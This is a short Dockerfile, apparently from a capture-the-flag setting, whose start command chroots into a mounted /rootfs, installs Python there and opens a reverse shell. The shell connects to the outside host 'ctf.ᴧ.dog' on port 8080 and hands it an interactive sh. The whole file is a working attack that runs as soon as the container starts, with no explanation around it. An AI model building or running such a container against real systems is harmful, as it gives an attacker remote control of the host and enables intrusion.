from alpine:latest

CMD ["sh", "-c", "chroot /rootfs /sbin/apk add --no-cache python3 && chroot /rootfs /usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ctf.ᴧ.dog',8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('sh')\""]
